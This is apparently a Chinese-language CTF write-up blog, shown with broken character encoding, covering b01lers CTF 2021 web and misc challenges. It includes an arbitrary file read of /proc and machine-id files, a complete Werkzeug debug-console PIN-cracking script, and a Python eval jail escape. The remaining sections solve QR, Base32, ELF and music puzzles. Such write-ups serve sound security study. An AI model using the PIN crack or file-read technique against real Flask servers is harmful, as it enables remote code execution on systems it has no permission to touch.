\xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ CyberChef From Hex è§£ç åå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœŒï¸â˜ï¸â™“ï¸â§«ï¸â˜Ÿï¸â—†ï¸â™Œï¸â’ï¸â™ï¸â—»ï¸â–¡ï¸â¬§ï¸â™“ï¸â§«ï¸â–¡ï¸â’ï¸â“ï¸â– ï¸â™‹ï¸âï¸â™ï¸â™ï¸ğŸ“‚ï¸â™ï¸â™ï¸ğŸ±ï¸â™ï¸â™‹ï¸ğŸ™µâ™“ï¸â¬§ï¸â–ï¸â™ï¸â’ï¸â“ï¸â™“ï¸â– ï¸â§«ï¸â™ï¸â’ï¸â™ï¸â¬§ï¸â§«ï¸â™“ï¸â– ï¸â™‘ï¸ğŸ“¬ï¸ğŸ•ˆï¸â™’ï¸â“ï¸â– ï¸â–¡ï¸â§«ï¸â§«ï¸â™‹ï¸ğŸ™µâ™ï¸â™‹ï¸â—ï¸â–¡ï¸â–¡ï¸ğŸ™µâ™‹ï¸â§«ï¸â™“ï¸â§«ï¸âœï¸</span><br></pre></td></tr></table></figure><p>ç”¨ <a href="https://wingdingstranslator.com/">Wingdings Translator</a> å°†å…¶ç¿»è¯‘åå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aï¸Gï¸iï¸tï¸Hï¸uï¸bï¸rï¸eï¸pï¸oï¸sï¸iï¸tï¸oï¸rï¸yï¸nï¸aï¸mï¸eï¸dï¸1ï¸cï¸eï¸Pï¸eï¸aï¸ğŸ™µiï¸sï¸vï¸eï¸rï¸yï¸iï¸nï¸tï¸eï¸rï¸eï¸sï¸tï¸iï¸nï¸gï¸.ï¸Wï¸hï¸yï¸nï¸oï¸tï¸tï¸aï¸ğŸ™µeï¸aï¸lï¸oï¸oï¸ğŸ™µaï¸tï¸iï¸tï¸?ï¸</span><br></pre></td></tr></table></figure><p>åœ¨ GitHub ä¸Šæœå¯» 1cePeak å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª repositoryï¼Œåœ¨å…¶æ–‡ä»¶ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å…³é”®å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>How_6ad_c0uld_a_1cePeak_be?</code> ä½œä¸º key è§£å¯† emoji-aes çš„å¯†æ–‡å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e32f619b-dbcd-49bd-9126-5d841aa01767&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b01lers CTF 2021</title>
      <link href="/zh-CN/posts/1ff2873b.html"/>
      <url>/zh-CN/posts/1ff2873b.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="gdpr"><a href="#gdpr" class="headerlink" title="gdpr"></a>gdpr</h3><p>æŸ¥çœ‹é¡µé¢æºä»£ç å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/flag_policy&quot;</span>&gt;</span>Flag policy:<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å®šå‘åˆ° <code>/flag_policy</code> å³å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;annoying_but_good?&#125;</span><br></pre></td></tr></table></figure><h3 id="lorem-ipsum"><a href="#lorem-ipsum" class="headerlink" title="lorem_ipsum"></a>lorem_ipsum</h3><h4 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h4><p>GET å‚æ•° <code>animal</code> å¤„ä»£ç é€»è¾‘å¯ç”¨æŠ¥é”™å¸¦å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    f = request.args.get(<span class="string">&#x27;animal&#x27;</span>, <span class="string">&#x27;dogs&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;blockquote&gt;&#123;&#125;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“æ­¤å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸”ä»…å¯è¯»å– 200 é•¿åº¦çš„å†…å®¹ã€‚å°è¯•è¯»å– <code>/proc/self/cmdline</code> å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3 /home/loremipsum/loremipsum.py</span><br></pre></td></tr></table></figure><p>åŒæ—¶å°è¯•ä¼ å…¥ <code>animal=flag</code> å¯ä»¥å¾—åˆ°å†…å®¹è€Œä¸æ˜¯æŠ¥é”™ï¼ŒçŒœæµ‹ flag æ–‡ä»¶å°±å­˜åœ¨å½“å‰ç›®å½•ä¸‹ã€‚ä¸‹ä¸€æ­¥è¦åšçš„å°±æ˜¯çªç ´æ–‡ä»¶è¯»å–é•¿åº¦é™åˆ¶ã€‚</p><h4 id="Werkzeug-Debug-Console-PIN-Crack"><a href="#Werkzeug-Debug-Console-PIN-Crack" class="headerlink" title="Werkzeug Debug Console PIN Crack"></a>Werkzeug Debug Console PIN Crack</h4><blockquote><p>å‚è€ƒï¼š<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug</a></p></blockquote><p>å‚è€ƒæ–‡ç« ä¸­æœ‰é€†å‘ Werkzeug Debug Console çš„ PIN ç”ŸæˆåŸç†çš„å†…å®¹ï¼Œè¿™é‡Œç›´æ¥è´´è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;web3_user&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/dist-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;279275995014060&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;d4e6cb65d59544f3331ea0425dc555a1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"><span class="comment"># h.update(b&#x27;shittysalt&#x27;)</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><code>/sys/class/net/ens33/address</code> è¯»å–åˆ° MAC åœ°å€ <code>02:42:ac:1b:00:02</code> å¹¶å°†å…¶<a href="https://www.vultr.com/resources/mac-converter/">è½¬æ¢</a>æˆåè¿›åˆ¶ <code>2485378547714</code>ã€‚<code>/proc/self/environ</code> å¯ä»¥åŒ…å«å‡º username ä¸º <code>loremipsum</code>ã€‚ä¹‹å‰çš„æŠ¥é”™ä¸­å¯ä»¥æ‰¾åˆ° flask çš„è¿è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ <code>/usr/local/lib/python3.6/dist-packages/flask/app.py</code>ã€‚</p><blockquote><h4 id="machine-id-not-found"><a href="#machine-id-not-found" class="headerlink" title="machine-id not found"></a>machine-id not found</h4><p>ä½¿ç”¨ <code>boot-id + cgroup</code> æ¥ä»£æ›¿æ‰€éœ€çš„ machine-idã€‚<code>/proc/sys/kernel/random/boot_id</code> è¯»å‡ºä¸€ä¸ªæ‰€éœ€çš„ boot-id <code>b875f129-5ae6-4ab1-90c0-ae07a6134578</code>ã€‚<code>/proc/self/cgroup</code> å¯ä»¥è¯»åˆ° cgroupï¼Œä»ä¸­é€‰ä¸€ä¸ªä¸ boot-id æ‹¼æ¥èµ·æ¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b875f129-5ae6-4ab1-90c0-ae07a6134578e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae</span><br></pre></td></tr></table></figure></blockquote><p>å°†ä¸Šè¿°å¾—åˆ°çš„å†…å®¹å¡«è¿›è„šæœ¬ä¸­è¿è¡Œå¯å¾— PIN ä¸º <code>126-739-410</code>ã€‚ç›´æ¥åœ¨æŠ¥é”™é¡µé¢è§£é” Debug Shell ç„¶åè¯»å–æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617678191018/bd83098f3c53633a473db247b076ec5cc8f3bf77.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b0ctf&#123;Fl4sK_d3buG_is_InseCure&#125;</span><br></pre></td></tr></table></figure><h3 id="Pyjailgolf-1"><a href="#Pyjailgolf-1" class="headerlink" title="Pyjailgolf 1"></a>Pyjailgolf 1</h3><p>é¢˜ç›®ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">line = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) &gt; <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">eval</span>(line)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åªéœ€è¦ä½¿ç”¨æŠ¥é”™å¸¦å‡º flag å³å¯ï¼Œå› æ­¤æ„é€ å‡º <code>help(flag)</code> å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">help</span>(flag) </span><br><span class="line">No Python documentation found <span class="keyword">for</span> <span class="string">&#x27;pctf&#123;JusT_a5k_4_h3lP!&#125;&#x27;</span>.</span><br><span class="line">Use <span class="built_in">help</span>() to get the interactive <span class="built_in">help</span> utility.</span><br><span class="line">Use <span class="built_in">help</span>(str) <span class="keyword">for</span> <span class="built_in">help</span> on the str class.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;JusT_a5k_4_h3lP!&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="NSNC"><a href="#NSNC" class="headerlink" title="NSNC"></a>NSNC</h3><p>é¢˜ç›®é™„ä»¶æ˜¯ä¸€å¼ å›¾ï¼Œä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°æœ‰åˆ†å¼€çš„ä¸¤åŠäºŒç»´ç ï¼Œå°†å…¶ä¿®æ­£ä¸€ä¸‹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544624997/be5f53c326a1ed3cb6d9946b1156cc3269edc882.png@300w"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544675500/6a73bf006f5a53ad8c2096ab97716d215ce6850e.png@200w" alt="image-20210404215755317"></p><p>æ‰«æäºŒç»´ç å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MJRXIZT3NZPWKZTGL52GKZLTL5RWC3TUL5RDGX3XGBZG4X3MNFVTGX3SMU2GYX3UGMZXG7I&#x3D;</span><br></pre></td></tr></table></figure><p>Base32 è§£ç ä¸€æ¬¡å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;n_eff_tees_cant_b3_w0rn_lik3_re4l_t33s&#125;</span><br></pre></td></tr></table></figure><h3 id="Elfcraft"><a href="#Elfcraft" class="headerlink" title="Elfcraft"></a>Elfcraft</h3><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€å † mcfunction æ–‡ä»¶ï¼Œå°†å…¶ä½¿ç”¨æŒ‡ä»¤æ‹¼æ¥èµ·æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> *.mcfunction &gt;&gt; combination.mcfunction</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿå…¶æ•°æ®ç‰¹å¾å¯çŸ¥å…¶ä¸­åŒ…å«ç€ä¸‰ç»´åæ ‡ä¸” y è½´å¤§éƒ¨åˆ†ä¸º -1ã€‚å› æ­¤å°† x, z ä¸¤ä¸ªè½´çš„å†…å®¹ç”¨æ­£åˆ™ç¨å¾®å¤„ç†åæå–å‡ºæ¥ä¹‹åå†™ä¸ªè„šæœ¬å°è¯•æ„å»ºå›¾ç‰‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;execute as @a\[scores&#x3D;&#123;search&#x3D;1&#125;\] if block ~(\d&#123;1,3&#125;) ~-1 ~(\d&#123;1,3&#125;) minecraft:white_concrete run&#x2F;</span><br><span class="line">&#x2F;scoreboard players add @a localChecks 1&#x2F;</span><br><span class="line">&#x2F;execute as @a.*\n&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"></span><br><span class="line">img = PIL.Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">15</span>, <span class="number">1367</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">coords = <span class="built_in">open</span>(<span class="string">&#x27;...\\combination.mcfunction&#x27;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> coordsLine <span class="keyword">in</span> coords:</span><br><span class="line">    x, y = coordsLine.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)), (<span class="number">16</span>,<span class="number">63</span>,<span class="number">145</span>))</span><br><span class="line">img.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„å›¾ç‰‡ä¸Šæœ‰ä¸€äº› hex æ•°æ®ã€‚</p><blockquote><p>result.png å¤ªé•¿äº†ä¸æ˜¯å¾ˆå¥½æ”¾ğŸ‘‡</p><p><a href="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png">https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png</a></p></blockquote><p>å°†å…¶ä¸­çš„å†…å®¹è½¬å†™ï¼Œå¯å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">7F 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">02 00 03 00 01 00 00 00 54 80 04 08 34 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 34 00 20 00 01 00 00 00</span><br><span class="line">00 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08</span><br><span class="line">00 80 04 08 E4 00 00 00 E4 00 00 00 05 00 00 00</span><br><span class="line">00 10 00 00 C7 04 24 00 00 00 00 C7 44 24 FC 00</span><br><span class="line">00 00 00 C7 44 24 F8 00 00 00 00 C7 04 24 00 00</span><br><span class="line">00 00 BA 01 00 00 00 89 E1 BB 00 00 00 00 B8 03</span><br><span class="line">00 00 00 CD B0 0F B6 54 24 FC 0F B6 8A CB 80 04</span><br><span class="line">08 0F B6 14 24 31 D1 89 4C 24 F8 BA 01 00 00 00</span><br><span class="line">89 E1 83 E9 08 BB 01 00 00 00 B8 04 00 00 00 CD</span><br><span class="line">80 8B 4C 24 FC 41 89 4C 24 FC 83 F9 19 7C C6 BB</span><br><span class="line">00 00 00 00 B8 01 00 00 00 CD B0 00 01 16 04 19</span><br><span class="line">0F 53 0C 51 01 10 03 56 04 16 3D 27 2E 24 01 10</span><br><span class="line">56 04 16 1F</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å¾—çŸ¥è¿™æ˜¯ä¸ª ELF æ–‡ä»¶ï¼Œæ­¤æ—¶å†ä½¿ç”¨ IDA æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ã€‚å¯ä»¥çœ‹åˆ°å…¶åç¼–è¯‘ä»£ç ä¸­æœ‰å¦‚ä¸‹å‡ å¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8)retaddr ^ *((<span class="keyword">unsigned</span> __int8 *)&amp;loc_80480CB + (<span class="keyword">unsigned</span> __int8)v6);</span><br><span class="line">  v1 = sys_write(<span class="number">1</span>, &amp;v5, <span class="number">1u</span>);</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  v6 = v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ¨æµ‹ä½¿ç”¨äº†äº¦æˆ–çš„æ–¹æ³•ã€‚å› ä¸ºæ•°æ®åœ¨ <code>loc_80480CB</code> çš„ä½ç½®ï¼Œå› æ­¤å°†æ­¤å¤„åŠå…¶åé¢çš„å†…å®¹æå–å‡ºæ¥ï¼Œåšäº¦æˆ–æ“ä½œã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617687947254/eb44c22f6a137a8d0b9834285349510a24c442e7.png"></p><p>å› ä¸º flag ä»¥ b å¼€å¤´ï¼Œä¸”æ•°æ®ç¬¬ä¸€ä½ä¸º <code>00</code>ï¼Œå› æ­¤å°è¯•å°†æå–å‡ºæ¥çš„å†…å®¹äº¦æˆ–å­—ç¬¦ bã€‚æ­¤æ—¶å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;m1n3cra4ft_ELFcr4ft&#125;</span><br></pre></td></tr></table></figure><h3 id="Bars-Windchests-Vocals"><a href="#Bars-Windchests-Vocals" class="headerlink" title="Bars, Windchests, Vocals"></a>Bars, Windchests, Vocals</h3><blockquote><p>Hint! The problem gives you an actual flag, it is not just a long number.<br>Hint! The long number you get <em>is</em> the flag (in a form that computers love). It is in bctf{â€¦} format, all bells and whistles are included in it.</p></blockquote><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€ä¸ªåŒ…å«å¾ˆå¤šä¹è°±çš„ PDF æ–‡ä»¶ï¼Œåœ¨å…¶æœ€åä¸€é¡µå¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617870522255/5f6a875934623950158379f8b6d6daa577e1a4f7.png"></p><p>æœç´¢å·´èµ«çš„ä½œå“å¯ä»¥å‘ç°ä¸€ä¸ª BWV ç¼–å·ï¼Œç±»ä¼¼å¦‚ä¸‹å†…å®¹ã€‚ï¼ˆè¿™é‡Œä½œå“ç¼–å·å¤ªå¤šäº†ï¼Œå‚è€ƒäº†å¤§ä½¬çš„ <a href="https://github.com/franfrancisco9/B01lers_CTF">WriteUp</a>ï¼‰</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gib dich zufrieden BWV 510</span><br><span class="line">PrÃ¤ludium und Fuge As-Dur BWV 862</span><br><span class="line">Befiehl du deine Wege BWV 272</span><br><span class="line">Prelude and Fugue in C major BWV 870</span><br><span class="line">Praeludium et Fuga BWV 546</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾æ‰€ç»™é™„ä»¶ä¸­æ‰€æœ‰ä½œå“çš„ç¼–å·å¹¶å¯¹åº”ç½—é©¬æ•°å­—å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">I &#x3D; 510</span><br><span class="line">II &#x3D; 862</span><br><span class="line">III &#x3D; 272</span><br><span class="line">IV &#x3D; 870</span><br><span class="line">V &#x3D; 546</span><br><span class="line">VI &#x3D; 146</span><br><span class="line">VII &#x3D; 189</span><br><span class="line">VIII 